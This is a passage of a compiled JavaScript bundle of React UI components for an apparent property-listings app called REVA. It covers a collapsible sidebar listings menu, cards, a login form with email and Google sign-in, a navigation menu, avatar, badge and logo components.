                                /* @__PURE__ */ (0, import_jsx_runtime14.jsxs)("span", {
                                    children: [
                                        "View ",
                                        remainingCount,
                                        " more"
                                    ]
                                })
                            ]
                        })
                    })
                ]
            })
        ]
    });
}
// src/components/ui/collapsible.tsx
var CollapsiblePrimitive = __toESM(require("@radix-ui/react-collapsible"));
var Collapsible = CollapsiblePrimitive.Root;
var CollapsibleTrigger2 = CollapsiblePrimitive.CollapsibleTrigger;
var CollapsibleContent2 = CollapsiblePrimitive.CollapsibleContent;
// src/components/sidebar/nav-listings.tsx
var import_react_icons3 = require("@radix-ui/react-icons");
var import_lucide_react6 = require("lucide-react");
var import_react3 = require("react");
var import_jsx_runtime15 = require("react/jsx-runtime");
function NavListings(param) {
    var listings = param.listings, _param_maxCategories = param.maxCategories, maxCategories = _param_maxCategories === void 0 ? 3 : _param_maxCategories, _param_maxPropertiesPerCategory = param.maxPropertiesPerCategory, maxPropertiesPerCategory = _param_maxPropertiesPerCategory === void 0 ? 3 : _param_maxPropertiesPerCategory;
    var _ref = _sliced_to_array((0, import_react3.useState)([]), 2), expandedCategories = _ref[0], setExpandedCategories = _ref[1];
    var toggleCategory = function(categoryName) {
        setExpandedCategories(function(prev) {
            return prev.includes(categoryName) ? prev.filter(function(name) {
                return name !== categoryName;
            }) : _to_consumable_array(prev).concat([
                categoryName
            ]);
        });
    };
    var displayListings = listings.slice(0, maxCategories);
    var remainingCategories = Math.max(0, listings.length - maxCategories);
    return /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarGroup, {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarGroupLabel, {
                className: "flex justify-between items-center",
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime15.jsx)("span", {
                        children: "Listings"
                    }),
                    remainingCategories > 0 && /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)("span", {
                        className: "text-xs text-muted-foreground",
                        children: [
                            listings.length,
                            " categories"
                        ]
                    })
                ]
            }),
            /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarGroupContent, {
                children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarMenu, {
                    children: [
                        displayListings.map(function(category) {
                            return /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(Collapsible, {
                                open: expandedCategories.includes(category.name),
                                children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarMenuItem, {
                                    children: [
                                        /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarMenuButton, {
                                            asChild: true,
                                            className: "py-1.5",
                                            onClick: function() {
                                                return toggleCategory(category.name);
                                            },
                                            children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)("a", {
                                                href: "#",
                                                children: [
                                                    category.icon || /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(import_lucide_react6.Building, {
                                                        className: "h-3.5 w-3.5 mr-2 text-muted-foreground"
                                                    }),
                                                    /* @__PURE__ */ (0, import_jsx_runtime15.jsx)("span", {
                                                        className: "truncate",
                                                        children: category.name
                                                    }),
                                                    /* @__PURE__ */ (0, import_jsx_runtime15.jsx)("span", {
                                                        className: "ml-auto text-xs text-muted-foreground",
                                                        children: category.properties.length
                                                    })
                                                ]
                                            })
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(CollapsibleTrigger2, {
                                            asChild: true,
                                            children: /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarMenuAction, {
                                                className: "left-2 bg-sidebar-accent text-sidebar-accent-foreground data-[state=open]:rotate-90",
                                                showOnHover: true,
                                                onClick: function() {
                                                    return toggleCategory(category.name);
                                                },
                                                children: /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(import_react_icons3.ChevronRightIcon, {})
                                            })
                                        }),
                                        /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(CollapsibleContent2, {
                                            children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarMenuSub, {
                                                children: [
                                                    category.properties.slice(0, maxPropertiesPerCategory).map(function(property) {
                                                        return /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarMenuSubItem, {
                                                            children: /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarMenuSubButton, {
                                                                asChild: true,
                                                                className: "py-1",
                                                                children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)("a", {
                                                                    href: property.url,
                                                                    children: [
                                                                        property.icon || /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(import_lucide_react6.Home, {
                                                                            className: "h-3 w-3 mr-2 text-muted-foreground"
                                                                        }),
                                                                        /* @__PURE__ */ (0, import_jsx_runtime15.jsx)("span", {
                                                                            className: "truncate",
                                                                            children: property.name
                                                                        })
                                                                    ]
                                                                })
                                                            })
                                                        }, property.name);
                                                    }),
                                                    category.properties.length > maxPropertiesPerCategory && /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarMenuSubItem, {
                                                        children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarMenuSubButton, {
                                                            className: "text-sidebar-foreground/70 py-1",
                                                            children: [
                                                                /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(import_react_icons3.ChevronRightIcon, {
                                                                    className: "mr-2"
                                                                }),
                                                                /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)("span", {
                                                                    children: [
                                                                        "View",
                                                                        " ",
                                                                        category.properties.length - maxPropertiesPerCategory,
                                                                        " ",
                                                                        "more"
                                                                    ]
                                                                })
                                                            ]
                                                        })
                                                    })
                                                ]
                                            })
                                        })
                                    ]
                                })
                            }, category.name);
                        }),
                        remainingCategories > 0 && /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(SidebarMenuItem, {
                            children: /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)(SidebarMenuButton, {
                                className: "text-sidebar-foreground/70 py-1.5",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime15.jsx)(import_react_icons3.ChevronRightIcon, {
                                        className: "mr-2"
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime15.jsxs)("span", {
                                        children: [
                                            "View ",
                                            remainingCategories,
                                            " more categories"
                                        ]
                                    })
                                ]
                            })
                        })
                    ]
                })
            })
        ]
    });
}
// src/components/sidebar/sidebar-left.tsx
var import_jsx_runtime16 = require("react/jsx-runtime");
function SidebarLeft(_param) {
    var _param_logoLight = _param.logoLight, logoLight = _param_logoLight === void 0 ? "/logo.svg" : _param_logoLight, _param_logoDark = _param.logoDark, logoDark = _param_logoDark === void 0 ? "/logo-dark.svg" : _param_logoDark, navMainItems = _param.navMainItems, navSecondaryItems = _param.navSecondaryItems, historyItems = _param.historyItems, listingItems = _param.listingItems, _param_maxMainItems = _param.maxMainItems, maxMainItems = _param_maxMainItems === void 0 ? 6 : _param_maxMainItems, _param_maxSecondaryItems = _param.maxSecondaryItems, maxSecondaryItems = _param_maxSecondaryItems === void 0 ? 4 : _param_maxSecondaryItems, _param_maxHistoryItems = _param.maxHistoryItems, maxHistoryItems = _param_maxHistoryItems === void 0 ? 4 : _param_maxHistoryItems, _param_maxListingCategories = _param.maxListingCategories, maxListingCategories = _param_maxListingCategories === void 0 ? 3 : _param_maxListingCategories, _param_maxPropertiesPerCategory = _param.maxPropertiesPerCategory, maxPropertiesPerCategory = _param_maxPropertiesPerCategory === void 0 ? 2 : _param_maxPropertiesPerCategory, props = _object_without_properties(_param, [
        "logoLight",
        "logoDark",
        "navMainItems",
        "navSecondaryItems",
        "historyItems",
        "listingItems",
        "maxMainItems",
        "maxSecondaryItems",
        "maxHistoryItems",
        "maxListingCategories",
        "maxPropertiesPerCategory"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime16.jsxs)(Sidebar, _object_spread_props(_object_spread({
        className: "border-r-0 w-64"
    }, props), {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime16.jsxs)(SidebarHeader, {
                className: "h-auto py-2",
                children: [
                    /* @__PURE__ */ (0, import_jsx_runtime16.jsxs)("div", {
                        className: "m-2",
                        children: [
                            /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(import_image2.default, {
                                src: logoLight,
                                alt: "Logo",
                                width: 120,
                                height: 40,
                                className: "dark:hidden"
                            }),
                            /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(import_image2.default, {
                                src: logoDark,
                                alt: "Logo",
                                width: 120,
                                height: 40,
                                className: "hidden dark:block"
                            })
                        ]
                    }),
                    navMainItems && /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(NavMain, {
                        items: navMainItems,
                        maxItems: maxMainItems
                    })
                ]
            }),
            /* @__PURE__ */ (0, import_jsx_runtime16.jsxs)(SidebarContent, {
                className: "overflow-y-auto",
                children: [
                    historyItems && /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(NavHistory, {
                        history: historyItems,
                        maxItems: maxHistoryItems
                    }),
                    listingItems && /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(NavListings, {
                        listings: listingItems,
                        maxCategories: maxListingCategories,
                        maxPropertiesPerCategory: maxPropertiesPerCategory
                    }),
                    navSecondaryItems && /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(NavSecondary, {
                        items: navSecondaryItems,
                        maxItems: maxSecondaryItems,
                        className: "mt-auto"
                    })
                ]
            }),
            /* @__PURE__ */ (0, import_jsx_runtime16.jsx)(SidebarRail, {})
        ]
    }));
}
// src/components/ui/card.tsx
var React10 = __toESM(require("react"));
var import_jsx_runtime17 = require("react/jsx-runtime");
var Card = React10.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime17.jsx)("div", _object_spread({
        ref: ref,
        className: cn("rounded-xl border bg-card text-card-foreground shadow", className)
    }, props));
});
Card.displayName = "Card";
var CardHeader = React10.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime17.jsx)("div", _object_spread({
        ref: ref,
        className: cn("flex flex-col space-y-1.5 p-6", className)
    }, props));
});
CardHeader.displayName = "CardHeader";
var CardTitle = React10.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime17.jsx)("div", _object_spread({
        ref: ref,
        className: cn("font-semibold leading-none tracking-tight", className)
    }, props));
});
CardTitle.displayName = "CardTitle";
var CardDescription = React10.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime17.jsx)("div", _object_spread({
        ref: ref,
        className: cn("text-sm text-muted-foreground", className)
    }, props));
});
CardDescription.displayName = "CardDescription";
var CardContent = React10.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime17.jsx)("div", _object_spread({
        ref: ref,
        className: cn("p-6 pt-0", className)
    }, props));
});
CardContent.displayName = "CardContent";
var CardFooter = React10.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime17.jsx)("div", _object_spread({
        ref: ref,
        className: cn("flex items-center p-6 pt-0", className)
    }, props));
});
CardFooter.displayName = "CardFooter";
// src/components/ui/label.tsx
var React11 = __toESM(require("react"));
var LabelPrimitive = __toESM(require("@radix-ui/react-label"));
var import_class_variance_authority4 = require("class-variance-authority");
var import_jsx_runtime18 = require("react/jsx-runtime");
var labelVariants = (0, import_class_variance_authority4.cva)("text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70");
var Label2 = React11.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime18.jsx)(LabelPrimitive.Root, _object_spread({
        ref: ref,
        className: cn(labelVariants(), className)
    }, props));
});
Label2.displayName = LabelPrimitive.Root.displayName;
// src/components/login/login-form.tsx
var import_react4 = require("react");
var import_jsx_runtime19 = require("react/jsx-runtime");
function LoginForm(_param) {
    var className = _param.className, onEmailLogin = _param.onEmailLogin, onGoogleLogin = _param.onGoogleLogin, onForgotPassword = _param.onForgotPassword, onSignUp = _param.onSignUp, _param_backgroundImage = _param.backgroundImage, backgroundImage = _param_backgroundImage === void 0 ? "/pic.avif" : _param_backgroundImage, _param_title = _param.title, title = _param_title === void 0 ? "Welcome back" : _param_title, _param_subtitle = _param.subtitle, subtitle = _param_subtitle === void 0 ? "Login to your account" : _param_subtitle, props = _object_without_properties(_param, [
        "className",
        "onEmailLogin",
        "onGoogleLogin",
        "onForgotPassword",
        "onSignUp",
        "backgroundImage",
        "title",
        "subtitle"
    ]);
    var _ref = _sliced_to_array((0, import_react4.useState)(""), 2), email = _ref[0], setEmail = _ref[1];
    var _ref1 = _sliced_to_array((0, import_react4.useState)(""), 2), password = _ref1[0], setPassword = _ref1[1];
    var _ref2 = _sliced_to_array((0, import_react4.useState)(false), 2), loading = _ref2[0], setLoading = _ref2[1];
    var _ref3 = _sliced_to_array((0, import_react4.useState)(null), 2), error = _ref3[0], setError = _ref3[1];
    var handleEmailLogin = /*#__PURE__*/ function() {
        var _ref = _async_to_generator(function(e) {
            var error2;
            return _ts_generator(this, function(_state) {
                switch(_state.label){
                    case 0:
                        e.preventDefault();
                        if (!onEmailLogin) return [
                            2
                        ];
                        setLoading(true);
                        setError(null);
                        _state.label = 1;
                    case 1:
                        _state.trys.push([
                            1,
                            3,
                            4,
                            5
                        ]);
                        return [
                            4,
                            onEmailLogin(email, password)
                        ];
                    case 2:
                        _state.sent();
                        return [
                            3,
                            5
                        ];
                    case 3:
                        error2 = _state.sent();
                        setError(error2.message || "An error occurred during login");
                        return [
                            3,
                            5
                        ];
                    case 4:
                        setLoading(false);
                        return [
                            7
                        ];
                    case 5:
                        return [
                            2
                        ];
                }
            });
        });
        return function handleEmailLogin(e) {
            return _ref.apply(this, arguments);
        };
    }();
    var handleGoogleLogin = /*#__PURE__*/ function() {
        var _ref = _async_to_generator(function() {
            var error2;
            return _ts_generator(this, function(_state) {
                switch(_state.label){
                    case 0:
                        if (!onGoogleLogin) return [
                            2
                        ];
                        _state.label = 1;
                    case 1:
                        _state.trys.push([
                            1,
                            3,
                            ,
                            4
                        ]);
                        return [
                            4,
                            onGoogleLogin()
                        ];
                    case 2:
                        _state.sent();
                        return [
                            3,
                            4
                        ];
                    case 3:
                        error2 = _state.sent();
                        setError(error2.message || "An error occurred during Google login");
                        return [
                            3,
                            4
                        ];
                    case 4:
                        return [
                            2
                        ];
                }
            });
        });
        return function handleGoogleLogin() {
            return _ref.apply(this, arguments);
        };
    }();
    return /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", _object_spread_props(_object_spread({
        className: cn("flex flex-col gap-6", className)
    }, props), {
        children: [
            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)(Card, {
                className: "overflow-hidden",
                children: /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)(CardContent, {
                    className: "grid p-0 md:grid-cols-2",
                    children: [
                        /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("form", {
                            className: "p-6 md:p-8",
                            onSubmit: handleEmailLogin,
                            children: /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                                className: "flex flex-col gap-6",
                                children: [
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                                        className: "flex flex-col items-center text-center",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("h1", {
                                                className: "text-2xl font-bold",
                                                children: title
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("p", {
                                                className: "text-balance text-muted-foreground",
                                                children: subtitle
                                            })
                                        ]
                                    }),
                                    error && /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("div", {
                                        className: "bg-red-50 text-red-600 p-3 rounded-md text-sm",
                                        children: error
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                                        className: "grid gap-2",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)(Label2, {
                                                htmlFor: "email",
                                                children: "Email"
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)(Input, {
                                                id: "email",
                                                type: "email",
                                                placeholder: "m@example.com",
                                                required: true,
                                                value: email,
                                                onChange: function(e) {
                                                    return setEmail(e.target.value);
                                                }
                                            })
                                        ]
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                                        className: "grid gap-2",
                                        children: [
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                                                className: "flex items-center",
                                                children: [
                                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)(Label2, {
                                                        htmlFor: "password",
                                                        children: "Password"
                                                    }),
                                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("a", {
                                                        href: "#",
                                                        className: "ml-auto text-sm underline-offset-2 hover:underline",
                                                        onClick: function(e) {
                                                            e.preventDefault();
                                                            onForgotPassword === null || onForgotPassword === void 0 ? void 0 : onForgotPassword();
                                                        },
                                                        children: "Forgot your password?"
                                                    })
                                                ]
                                            }),
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)(Input, {
                                                id: "password",
                                                type: "password",
                                                required: true,
                                                value: password,
                                                onChange: function(e) {
                                                    return setPassword(e.target.value);
                                                }
                                            })
                                        ]
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)(Button, {
                                        type: "submit",
                                        className: "w-full",
                                        disabled: loading,
                                        children: loading ? "Signing in..." : "Sign in"
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("div", {
                                        className: "relative text-center text-sm after:absolute after:inset-0 after:top-1/2 after:z-0 after:flex after:items-center after:border-t after:border-border",
                                        children: /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("span", {
                                            className: "relative z-10 bg-background px-2 text-muted-foreground",
                                            children: "Or continue with"
                                        })
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("div", {
                                        className: "grid grid-cols-1 gap-4",
                                        children: /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)(Button, {
                                            variant: "outline",
                                            className: "w-full",
                                            onClick: handleGoogleLogin,
                                            type: "button",
                                            children: [
                                                /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("svg", {
                                                    xmlns: "http://www.w3.org/2000/svg",
                                                    viewBox: "0 0 24 24",
                                                    className: "w-5 h-5 mr-2",
                                                    children: /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("path", {
                                                        d: "M12.48 10.92v3.28h7.84c-.24 1.84-.853 3.187-1.787 4.133-1.147 1.147-2.933 2.4-6.053 2.4-4.827 0-8.6-3.893-8.6-8.72s3.773-8.72 8.6-8.72c2.6 0 4.507 1.027 5.907 2.347l2.307-2.307C18.747 1.44 16.133 0 12.48 0 5.867 0 .307 5.387.307 12s5.56 12 12.173 12c3.573 0 6.267-1.173 8.373-3.36 2.16-2.16 2.84-5.213 2.84-7.667 0-.76-.053-1.467-.173-2.053H12.48z",
                                                        fill: "currentColor"
                                                    })
                                                }),
                                                "Continue with Google"
                                            ]
                                        })
                                    }),
                                    /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                                        className: "text-center text-sm",
                                        children: [
                                            "Don't have an account?",
                                            " ",
                                            /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("a", {
                                                href: "#",
                                                className: "underline underline-offset-4",
                                                onClick: function(e) {
                                                    e.preventDefault();
                                                    onSignUp === null || onSignUp === void 0 ? void 0 : onSignUp();
                                                },
                                                children: "Sign up"
                                            })
                                        ]
                                    })
                                ]
                            })
                        }),
                        /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("div", {
                            className: "relative hidden bg-muted md:block",
                            children: /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("img", {
                                src: backgroundImage,
                                alt: "Image",
                                className: "absolute inset-0 h-full w-full object-cover dark:brightness-[0.2] dark:grayscale"
                            })
                        })
                    ]
                })
            }),
            /* @__PURE__ */ (0, import_jsx_runtime19.jsxs)("div", {
                className: "text-balance text-center text-xs text-muted-foreground [&_a]:underline [&_a]:underline-offset-4 hover:[&_a]:text-primary",
                children: [
                    "By clicking continue, you agree to our ",
                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("a", {
                        href: "#",
                        children: "Terms of Service"
                    }),
                    " ",
                    "and ",
                    /* @__PURE__ */ (0, import_jsx_runtime19.jsx)("a", {
                        href: "#",
                        children: "Privacy Policy"
                    }),
                    "."
                ]
            })
        ]
    }));
}
// src/components/reva-navbar/reva-navbar.tsx
var React14 = __toESM(require("react"));
var import_link3 = __toESM(require("next/link"));
var import_navigation2 = require("next/navigation");
var import_lucide_react7 = require("lucide-react");
// src/components/ui/navigation-menu.tsx
var React12 = __toESM(require("react"));
var NavigationMenuPrimitive = __toESM(require("@radix-ui/react-navigation-menu"));
var import_class_variance_authority5 = require("class-variance-authority");
var import_react_icons4 = require("@radix-ui/react-icons");
var import_jsx_runtime20 = require("react/jsx-runtime");
var NavigationMenu = React12.forwardRef(function(_param, ref) {
    var className = _param.className, children = _param.children, props = _object_without_properties(_param, [
        "className",
        "children"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime20.jsxs)(NavigationMenuPrimitive.Root, _object_spread_props(_object_spread({
        ref: ref,
        className: cn("relative z-10 flex max-w-max flex-1 items-center justify-center", className)
    }, props), {
        children: [
            children,
            /* @__PURE__ */ (0, import_jsx_runtime20.jsx)(NavigationMenuViewport, {})
        ]
    }));
});
NavigationMenu.displayName = NavigationMenuPrimitive.Root.displayName;
var NavigationMenuList = React12.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime20.jsx)(NavigationMenuPrimitive.List, _object_spread({
        ref: ref,
        className: cn("group flex flex-1 list-none items-center justify-center space-x-1", className)
    }, props));
});
NavigationMenuList.displayName = NavigationMenuPrimitive.List.displayName;
var NavigationMenuItem = NavigationMenuPrimitive.Item;
var navigationMenuTriggerStyle = (0, import_class_variance_authority5.cva)("group inline-flex h-9 w-max items-center justify-center rounded-md bg-background px-4 py-2 text-sm font-medium transition-colors hover:bg-accent hover:text-accent-foreground focus:bg-accent focus:text-accent-foreground focus:outline-none disabled:pointer-events-none disabled:opacity-50 data-[state=open]:text-accent-foreground data-[state=open]:bg-accent/50 data-[state=open]:hover:bg-accent data-[state=open]:focus:bg-accent");
var NavigationMenuTrigger = React12.forwardRef(function(_param, ref) {
    var className = _param.className, children = _param.children, props = _object_without_properties(_param, [
        "className",
        "children"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime20.jsxs)(NavigationMenuPrimitive.Trigger, _object_spread_props(_object_spread({
        ref: ref,
        className: cn(navigationMenuTriggerStyle(), "group", className)
    }, props), {
        children: [
            children,
            " ",
            /* @__PURE__ */ (0, import_jsx_runtime20.jsx)(import_react_icons4.ChevronDownIcon, {
                className: "relative top-[1px] ml-1 h-3 w-3 transition duration-300 group-data-[state=open]:rotate-180",
                "aria-hidden": "true"
            })
        ]
    }));
});
NavigationMenuTrigger.displayName = NavigationMenuPrimitive.Trigger.displayName;
var NavigationMenuContent = React12.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime20.jsx)(NavigationMenuPrimitive.Content, _object_spread({
        ref: ref,
        className: cn("left-0 top-0 w-full data-[motion^=from-]:animate-in data-[motion^=to-]:animate-out data-[motion^=from-]:fade-in data-[motion^=to-]:fade-out data-[motion=from-end]:slide-in-from-right-52 data-[motion=from-start]:slide-in-from-left-52 data-[motion=to-end]:slide-out-to-right-52 data-[motion=to-start]:slide-out-to-left-52 md:absolute md:w-auto ", className)
    }, props));
});
NavigationMenuContent.displayName = NavigationMenuPrimitive.Content.displayName;
var NavigationMenuLink = NavigationMenuPrimitive.Link;
var NavigationMenuViewport = React12.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime20.jsx)("div", {
        className: cn("absolute left-0 top-full flex justify-center"),
        children: /* @__PURE__ */ (0, import_jsx_runtime20.jsx)(NavigationMenuPrimitive.Viewport, _object_spread({
            className: cn("origin-top-center relative mt-1.5 h-[var(--radix-navigation-menu-viewport-height)] w-full overflow-hidden rounded-md border bg-popover text-popover-foreground shadow data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-90 md:w-[var(--radix-navigation-menu-viewport-width)]", className),
            ref: ref
        }, props))
    });
});
NavigationMenuViewport.displayName = NavigationMenuPrimitive.Viewport.displayName;
var NavigationMenuIndicator = React12.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime20.jsx)(NavigationMenuPrimitive.Indicator, _object_spread_props(_object_spread({
        ref: ref,
        className: cn("top-full z-[1] flex h-1.5 items-end justify-center overflow-hidden data-[state=visible]:animate-in data-[state=hidden]:animate-out data-[state=hidden]:fade-out data-[state=visible]:fade-in", className)
    }, props), {
        children: /* @__PURE__ */ (0, import_jsx_runtime20.jsx)("div", {
            className: "relative top-[60%] h-2 w-2 rotate-45 rounded-tl-sm bg-border shadow-md"
        })
    }));
});
NavigationMenuIndicator.displayName = NavigationMenuPrimitive.Indicator.displayName;
// src/components/ui/avatar.tsx
var React13 = __toESM(require("react"));
var AvatarPrimitive = __toESM(require("@radix-ui/react-avatar"));
var import_jsx_runtime21 = require("react/jsx-runtime");
var Avatar = React13.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime21.jsx)(AvatarPrimitive.Root, _object_spread({
        ref: ref,
        className: cn("relative flex h-10 w-10 shrink-0 overflow-hidden rounded-full", className)
    }, props));
});
Avatar.displayName = AvatarPrimitive.Root.displayName;
var AvatarImage = React13.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime21.jsx)(AvatarPrimitive.Image, _object_spread({
        ref: ref,
        className: cn("aspect-square h-full w-full", className)
    }, props));
});
AvatarImage.displayName = AvatarPrimitive.Image.displayName;
var AvatarFallback = React13.forwardRef(function(_param, ref) {
    var className = _param.className, props = _object_without_properties(_param, [
        "className"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime21.jsx)(AvatarPrimitive.Fallback, _object_spread({
        ref: ref,
        className: cn("flex h-full w-full items-center justify-center rounded-full bg-muted", className)
    }, props));
});
AvatarFallback.displayName = AvatarPrimitive.Fallback.displayName;
// src/components/ui/badge.tsx
var import_class_variance_authority6 = require("class-variance-authority");
var import_jsx_runtime22 = require("react/jsx-runtime");
var badgeVariants = (0, import_class_variance_authority6.cva)("inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2", {
    variants: {
        variant: {
            default: "border-transparent bg-primary text-primary-foreground hover:bg-primary/80",
            secondary: "border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80",
            destructive: "border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80",
            outline: "text-foreground"
        }
    },
    defaultVariants: {
        variant: "default"
    }
});
function Badge(_param) {
    var className = _param.className, variant = _param.variant, props = _object_without_properties(_param, [
        "className",
        "variant"
    ]);
    return /* @__PURE__ */ (0, import_jsx_runtime22.jsx)("div", _object_spread({
        className: cn(badgeVariants({
            variant: variant
        }), className)
    }, props));
}
// src/components/reva-navbar/reva-logo-dark.tsx
var import_next_themes3 = require("next-themes");
var import_image3 = __toESM(require("next/image"));
var import_link2 = __toESM(require("next/link"));
var import_jsx_runtime23 = require("react/jsx-runtime");
function RevaLogo() {
    var resolvedTheme = (0, import_next_themes3.useTheme)().resolvedTheme;
    var isDarkTheme = resolvedTheme === "dark";
    return /* @__PURE__ */ (0, import_jsx_runtime23.jsx)(import_link2.default, {
        href: "/",
        className: "flex items-center",
        children: isDarkTheme ? /* @__PURE__ */ (0, import_jsx_runtime23.jsx)(import_image3.default, {
            src: "/images/reva-logo-dark.svg",
            alt: "REVA",
            width: 100,
            height: 30,
            className: "h-8 w-auto",
            priority: true
        }) : /* @__PURE__ */ (0, import_jsx_runtime23.jsx)(import_image3.default, {
            src: "/images/reva-logo.png",
            alt: "REVA",
            width: 100,
            height: 30,
            className: "h-8 w-auto",
            priority: true
        })
    });
}
// src/components/reva-navbar/reva-navbar.tsx
var import_jsx_runtime24 = require("react/jsx-runtime");
function RevaNavbar(param) {
